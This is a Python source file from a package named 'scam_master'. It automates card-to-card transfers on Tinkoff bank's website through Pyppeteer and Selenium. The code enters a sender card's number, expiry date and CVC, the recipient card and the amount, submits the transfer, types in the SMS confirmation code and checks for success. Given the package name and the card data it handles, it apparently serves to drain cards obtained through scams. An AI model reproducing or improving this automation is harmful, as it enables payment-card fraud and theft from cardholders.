import asyncio
from pyppeteer.page import Page as PyppPage
from pyppeteer.errors import NetworkError
from selenium.webdriver.remote.webdriver import WebDriver
from selenium.webdriver.common.by import By
from loguru import logger
from time import sleep

from scam_master.infrastructure.banks.interface import IBankTransfer
from scam_master.services.models.transactions import Card
from scam_master.services.models.errors import UNKNOWN_TRANSFER_STATUS, BankError


class TinkoffTransfer(IBankTransfer):
    '''
    Тинькофф.
    Uses Pyppeteer and Selenium to interact with the site.
    '''

    @staticmethod
    async def fill_out_transfer_form(page: PyppPage, url: str, sender_card: Card, recipient_card_number: str, amount: int) -> None:
        if not isinstance(page, PyppPage):
            logger.warning(f'Unsupported driver: {type(page)}')
            raise UNKNOWN_TRANSFER_STATUS

        try:
            await page.goto(url)
            
            await page.waitForXPath("(//input[@name='cardNumber'])[1]")
            input_element = await page.xpath("(//input[@name='cardNumber'])[1]")
            await input_element[0].type(sender_card.card_number)

            await asyncio.sleep(2)

            await page.waitForSelector("input[name='date']")
            await page.type("input[name='date']", sender_card.expiration_date)
            
            await asyncio.sleep(2)

            for action in [f"//span[@data-value='{char}']" for char in sender_card.cvc]: 
                await page.waitForXPath(action)
                action_element = await page.xpath(action)
                await action_element[0].click()

            input_element = await page.xpath("(//input[@name='cardNumber'])[2]")
            await input_element[0].type(recipient_card_number)

            await asyncio.sleep(2)
            
            transfer_amount = f"{(amount / 100):.2f}"
            await page.type("input[name='moneyAmount']", transfer_amount)
            
            await asyncio.sleep(2)

            await page.waitForSelector('span[data-qa-file="CommissionDescription"]')
            
            await asyncio.sleep(2)
            
            await page.click('button[data-qa-file="SubmitButton"]')
            
            await asyncio.sleep(2)
        
        except NetworkError:
            raise UNKNOWN_TRANSFER_STATUS
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS


    @staticmethod
    async def check_confirm_transfer(page: PyppPage | WebDriver) -> None:
        try:
            if isinstance(page, PyppPage):
                return await TinkoffTransfer._check_confirm_transfer_pyppeteer(page)
            elif isinstance(page, WebDriver):
                return TinkoffTransfer._check_confirm_transfer_selenium(page)
            else:
                logger.warning(f'Unsupported driver: {type(page)}')
                raise UNKNOWN_TRANSFER_STATUS
        
        except (BankError, NetworkError):
            raise UNKNOWN_TRANSFER_STATUS
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS


    @staticmethod
    async def confirm_transfer(page: PyppPage | WebDriver, sms_code: str) -> None:
        try:
            if isinstance(page, PyppPage):
                return await TinkoffTransfer._confirm_transfer_pyppeteer(page, sms_code)
            elif isinstance(page, WebDriver):
                return TinkoffTransfer._confirm_transfer_selenium(page, sms_code)
            else:
                logger.warning(f'Unsupported driver: {type(page)}')
                raise UNKNOWN_TRANSFER_STATUS
        
        except (BankError, NetworkError):
            raise UNKNOWN_TRANSFER_STATUS
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS
    

    @staticmethod
    async def check_transfer_status(page: PyppPage | WebDriver) -> None:
        try:
            if isinstance(page, PyppPage):
                return await TinkoffTransfer._check_transfer_status_pyppeteer(page)
            elif isinstance(page, WebDriver):
                return TinkoffTransfer._check_transfer_status_selenium(page)
            else:
                logger.warning(f'Unsupported driver: {type(page)}')
                raise UNKNOWN_TRANSFER_STATUS
        
        except (BankError, NetworkError):
            raise UNKNOWN_TRANSFER_STATUS
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS
    

    @staticmethod
    async def _check_confirm_transfer_pyppeteer(page: PyppPage):
        await asyncio.sleep(6)

        field = await page.querySelector('input[name="password"]')
        if not field:
            raise UNKNOWN_TRANSFER_STATUS


    @staticmethod
    def _check_confirm_transfer_selenium(page: WebDriver):
        sleep(6)

        fields = page.find_elements(By.CSS_SELECTOR, 'input[name="password"]')
        if not fields:
            raise UNKNOWN_TRANSFER_STATUS


    @staticmethod
    async def _confirm_transfer_pyppeteer(page: PyppPage, sms_code: str) -> None:
        await asyncio.sleep(2)

        await page.waitForSelector('input[name="password"]')
        await page.type('input[name="password"]', sms_code)
    

    @staticmethod
    def _confirm_transfer_selenium(page: WebDriver, sms_code: str) -> None:
        sleep(2)

        field = page.find_element(By.CSS_SELECTOR, 'input[name="password"]')
        field.send_keys(sms_code)

    
    @staticmethod
    async def _check_transfer_status_pyppeteer(page: PyppPage) -> None:
        await asyncio.sleep(4)
        
        await page.waitForXPath('(//*[@data-qa-file="UIAlertError"] | //div[@data-qa-file="PageTitleContainer"])')
        elements = await page.xpath('(//span[@data-qa-file="UIAlertError" and contains(@class, "ui-alert-error__message")] | //div[@data-qa-file="PageTitleContainer"])')
        
        if not elements:
            raise UNKNOWN_TRANSFER_STATUS

        text = await page.evaluate('(e) => e.innerText', elements[0])

        logger.info(f'Transfer status: {text}')

        if 'Переведено' not in text:
            raise UNKNOWN_TRANSFER_STATUS


    @staticmethod
    def _check_transfer_status_selenium(page: WebDriver) -> None:
        sleep(4)

        element = page.find_element(By.XPATH, '(//span[@data-qa-file="UIAlertError" and contains(@class, "ui-alert-error__message")] | //div[@data-qa-file="PageTitleContainer"])')
        text = element.text

        logger.info(f'Transfer status: {text}')

        if 'Переведено' not in text:
            raise UNKNOWN_TRANSFER_STATUS
